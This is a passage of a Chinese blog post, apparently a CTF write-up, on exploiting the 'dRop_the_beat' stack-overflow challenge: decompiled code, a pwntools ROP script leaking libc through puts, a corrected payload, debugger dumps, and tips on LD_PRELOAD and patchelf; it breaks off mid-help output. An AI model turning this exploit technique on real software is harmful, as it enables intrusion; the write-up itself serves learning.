@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="以NewbieCTF2019的dRop_the_beat为例子，记录了一下撰写EXP和调试的一些小坑和技巧 首先检测这个程序 1234567syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy[*] &amp;apos;/mnt/hgfs/share/NewbieCTF/Pwnable">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EXP和调试的小坑-1">
+<meta property="og:url" content="http://yoursite.com/2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="以NewbieCTF2019的dRop_the_beat为例子，记录了一下撰写EXP和调试的一些小坑和技巧 首先检测这个程序 1234567syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy[*] &amp;apos;/mnt/hgfs/share/NewbieCTF/Pwnable">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-11-07T18:45:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EXP和调试的小坑-1">
+<meta name="twitter:description" content="以NewbieCTF2019的dRop_the_beat为例子，记录了一下撰写EXP和调试的一些小坑和技巧 首先检测这个程序 1234567syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy[*] &amp;apos;/mnt/hgfs/share/NewbieCTF/Pwnable">
+  <link rel="canonical" href="http://yoursite.com/2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>EXP和调试的小坑-1 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/06/EXP║═╡≈╩╘╡─╨í┐╙-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">EXP和调试的小坑-1
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-11-06 18:44:44" itemprop="dateCreated datePublished" datetime="2019-11-06T18:44:44-08:00">2019-11-06</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-11-07 10:45:24" itemprop="dateModified" datetime="2019-11-07T10:45:24-08:00">2019-11-07</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>以NewbieCTF2019的<strong>dRop_the_beat</strong>为例子，记录了一下撰写EXP和调试的一些小坑和技巧</p>
+<p>首先检测这个程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/NewbieCTF/Pwnable/dRop_the_beat$ checksec drop_the_beat_easy</span><br><span class="line">[*] &apos;/mnt/hgfs/share/NewbieCTF/Pwnable/dRop_the_beat/drop_the_beat_easy&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>就只是开启了栈不可执行的保护，然后用IDA Pro打开查看一下源代码</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+4h] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"      dP  888888ba   .88888.   888888ba       dP   dP                   dP                           dP   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"      88  88    `8b d8'   `8b  88    `8b      88   88                   88                           88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">".d888b88 a88aaaa8P' 88     88 a88aaaa8P'    d8888P 88d888b. .d8888b.    88d888b. .d8888b. .d8888b. d8888P "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"88'  `88  88   `8b. 88     88  88             88   88'  `88 88ooood8    88'  `88 88ooood8 88'  `88   88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"88.  .88  88     88 Y8.   .8P  88             88   88    88 88.  ...    88.  .88 88.  ... 88.  .88   88   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"`88888P8  dP     dP  `8888P'   dP             dP   dP    dP `88888P'    88Y8888' `88888P' `88888P8   dP   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_80489F3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"dROP The beat(easy version)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_80489F3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1) Give Him a Beat!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2) No Beat For You..!"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">":( Sorry, You Can't be with us..."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give Me a Beat!!"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wow... That's AWESOME!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单的栈溢出然后ROP的题目，大概思路就是暴露libc版本和地址即可，然后我写了一个错误的EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./drop_the_beat_easy"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./drop_the_beat_easy'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048672")</span></span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(libc_start_main_got)+p32(main)</span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"Wow... That's AWESOME!\n"</span>)</span><br><span class="line"><span class="comment">#info(p.recv())</span></span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我的payload写错了，应该是<strong>main</strong>作为函数的返回地址，<strong>libc</strong>作为第一个参数</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br></pre></td></tr></table></figure>
+
+<p>这里想说的是如何检查自己的payload是否书写正确，就是最后的返回地址<strong>EIP</strong>是否劫持成功，这里有一个下断点的小技巧，我们一般下在溢出函数后的一个<code>leave</code>指令处</p>
+<p>例如这题的汇编代码</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804864F</span>                 call    _puts</span><br><span class="line">.text:<span class="number">08048654</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">08048657</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0804865</span>C                 jmp     <span class="keyword">short</span> locret_8048672</span><br><span class="line">.text:<span class="number">0804865</span>E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0804865</span>E</span><br><span class="line">.text:<span class="number">0804865</span>E loc_804865E:                            ; CODE XREF: main+E1↑j</span><br><span class="line">.text:<span class="number">0804865</span>E                 push    offset aSorryYouCanTBe ; <span class="string">":( Sorry, You Can't be with us..."</span></span><br><span class="line">.text:<span class="number">08048663</span>                 call    _puts</span><br><span class="line">.text:<span class="number">08048668</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804866B</span>                 push    <span class="number">1</span>               ; status</span><br><span class="line">.text:<span class="number">0804866</span>D                 call    _exit</span><br><span class="line">.text:<span class="number">08048672</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048672</span></span><br><span class="line">.text:<span class="number">08048672</span> locret_8048672:                         ; CODE XREF: main+<span class="number">121</span>↑j</span><br><span class="line">.text:<span class="number">08048672</span>                 leave</span><br><span class="line">.text:<span class="number">08048673</span>                 retn</span><br><span class="line">.text:<span class="number">08048673</span> ; &#125; <span class="comment">// starts at 804853B</span></span><br><span class="line">.text:<span class="number">08048673</span> main            endp</span><br><span class="line">.text:<span class="number">08048673</span></span><br></pre></td></tr></table></figure>
+
+<p>我们就一般下在<strong>0x08048672</strong>处，然后开始调试一遍错误的payload</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : <span class="number">0x0</span>       </span><br><span class="line">$ebx   : <span class="number">0x0</span>       </span><br><span class="line">$ecx   : <span class="number">0xffffffff</span></span><br><span class="line">$edx   : <span class="number">0xf7ed9870</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$esp   : <span class="number">0xffd211ac</span>  →  <span class="number">0x080483e0</span>  →  &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt; jmp DWORD PTR ds:<span class="number">0x804a010</span></span><br><span class="line">$ebp   : <span class="number">0x41414141</span> (<span class="string">"AAAA"</span>?)</span><br><span class="line">$esi   : <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$edi   : <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$eip   : <span class="number">0x08048673</span>  →  &lt;main+<span class="number">312</span>&gt; ret </span><br><span class="line">$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: <span class="number">0x0023</span> $ss: <span class="number">0x002b</span> $ds: <span class="number">0x002b</span> $es: <span class="number">0x002b</span> $fs: <span class="number">0x0000</span> $gs: <span class="number">0x0063</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span><br><span class="line"><span class="number">0xffd211ac</span>│+<span class="number">0x0000</span>: <span class="number">0x080483e0</span>  →  &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt; jmp DWORD PTR ds:<span class="number">0x804a010</span>	 ← $esp</span><br><span class="line"><span class="number">0xffd211b0</span>│+<span class="number">0x0004</span>: <span class="number">0x0804a018</span>  →  <span class="number">0xf7d3e540</span>  →  &lt;__libc_start_main+<span class="number">0</span>&gt; call <span class="number">0xf7e45b59</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"><span class="number">0xffd211b4</span>│+<span class="number">0x0008</span>: <span class="number">0x0804853b</span>  →  &lt;main+<span class="number">0</span>&gt; push ebp</span><br><span class="line"><span class="number">0xffd211b8</span>│+<span class="number">0x000c</span>: <span class="number">0xffd2124c</span>  →  <span class="number">0xffd2330d</span>  →  <span class="string">"QT_QPA_PLATFORMTHEME=appmenu-qt5"</span></span><br><span class="line"><span class="number">0xffd211bc</span>│+<span class="number">0x0010</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c0</span>│+<span class="number">0x0014</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c4</span>│+<span class="number">0x0018</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c8</span>│+<span class="number">0x001c</span>: <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:<span class="number">32</span> ────</span><br><span class="line">    <span class="number">0x8048667</span> &lt;main+<span class="number">300</span>&gt;       inc    DWORD PTR [ebx+<span class="number">0x16a04c4</span>]</span><br><span class="line">    <span class="number">0x804866d</span> &lt;main+<span class="number">306</span>&gt;       call   <span class="number">0x80483f0</span> &lt;<span class="built_in">exit</span>@plt&gt;</span><br><span class="line">    <span class="number">0x8048672</span> &lt;main+<span class="number">311</span>&gt;       leave  </span><br><span class="line"> →  <span class="number">0x8048673</span> &lt;main+<span class="number">312</span>&gt;       ret    </span><br><span class="line">   ↳   <span class="number">0x80483e0</span> &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt;     jmp    DWORD PTR ds:<span class="number">0x804a010</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现函数的返回地址是错误的，然后我们运行一遍正确的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0       </span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0xffffffff</span><br><span class="line">$edx   : 0xf7f9a870  →  0x00000000</span><br><span class="line">$esp   : 0xffddb3fc  →  0x080483e0  →  &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010</span><br><span class="line">$ebp   : 0x41414141 (&quot;AAAA&quot;?)</span><br><span class="line">$esi   : 0xf7f99000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7f99000  →  0x001b1db0</span><br><span class="line">$eip   : 0x08048673  →  &lt;main+312&gt; ret </span><br><span class="line">$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffddb3fc│+0x0000: 0x080483e0  →  &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010	 ← $esp</span><br><span class="line">0xffddb400│+0x0004: 0x0804853b  →  &lt;main+0&gt; push ebp</span><br><span class="line">0xffddb404│+0x0008: 0x0804a018  →  0xf7dff540  →  &lt;__libc_start_main+0&gt; call 0xf7f06b59 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">0xffddb408│+0x000c: 0xffddb49c  →  0xffddd30d  →  &quot;QT_QPA_PLATFORMTHEME=appmenu-qt5&quot;</span><br><span class="line">0xffddb40c│+0x0010: 0x00000000</span><br><span class="line">0xffddb410│+0x0014: 0x00000000</span><br><span class="line">0xffddb414│+0x0018: 0x00000000</span><br><span class="line">0xffddb418│+0x001c: 0xf7f99000  →  0x001b1db0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048667 &lt;main+300&gt;       inc    DWORD PTR [ebx+0x16a04c4]</span><br><span class="line">    0x804866d &lt;main+306&gt;       call   0x80483f0 &lt;exit@plt&gt;</span><br><span class="line">    0x8048672 &lt;main+311&gt;       leave  </span><br><span class="line"> →  0x8048673 &lt;main+312&gt;       ret    </span><br><span class="line">   ↳   0x80483e0 &lt;puts@plt+0&gt;     jmp    DWORD PTR ds:0x804a010</span><br><span class="line">       0x80483e6 &lt;puts@plt+6&gt;     push   0x8</span><br><span class="line">       0x80483eb &lt;puts@plt+11&gt;    jmp    0x80483c0</span><br><span class="line">       0x80483f0 &lt;exit@plt+0&gt;     jmp    DWORD PTR ds:0x804a014</span><br><span class="line">       0x80483f6 &lt;exit@plt+6&gt;     push   0x10</span><br><span class="line">       0x80483fb &lt;exit@plt+11&gt;    jmp    0x80483c0</span><br></pre></td></tr></table></figure>
+
+<p>可以发现返回地址正确了</p>
+<p>总之第一点就是下断点可以下在<code>leave</code>处</p>
+<p>还有就是在程序为完全静态编译没有调用动态库的时候也是可以知道一些相关的编译信息的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings ./binary_name | grep GCC</span><br><span class="line">确定Ubuntu多少版本和gcc版本</span><br></pre></td></tr></table></figure>
+
+<p>例如这题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$  strings ./drop_the_beat_easy | grep GCC</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br></pre></td></tr></table></figure>
+
+<p>还有一个命令是可以查看当前程序的动态加载库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ ldd ./drop_the_beat_easy</span><br><span class="line">	linux-gate.so.1 =&gt;  (0xf7f18000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d41000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f1a000)</span><br></pre></td></tr></table></figure>
+
+<p>然后在题目给了libc的情况下，我们的程序如果没有经过修改就运行的话，调用的是我们本机的libc库，所以我们需要修改他的动态加载库</p>
+<p>在写exp的时候可以这样写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(&quot;./drop_the_beat_easy&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>后面的env就是动态加载库的文件</p>
+<p>我们还可以通过安装 patchelf 来直接重定位软件的动态加载库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf  --set-interpreter /mnt/hgfs/shared/multi_version_ld/ld-2.23_x86-64.so.2 ./babystack</span><br></pre></td></tr></table></figure>
+
+<p>patchelf 的更多命令还是通过help进行查看</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ patchelf --help</span><br><span class="line">syntax: patchelf</span><br><span class="line">  [--<span class="built_in">set</span>-interpreter FILENAME]</span><br><span class="line">  [--page-size SIZE]</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-soname]		Prints 'DT_SONAME' entry of .dynamic section. Raises an error if DT_SONAME doesn't exist</span><br><span class="line">  [--set-soname SONAME]		Sets 'DT_SONAME' entry to SONAME.</span><br><span class="line">  [--<span class="built_in">set</span>-rpath RPATH]</span><br><span class="line">  [--remove-rpath]</span><br><span class="line">  [--shrink-rpath]</span><br><span class="line"> 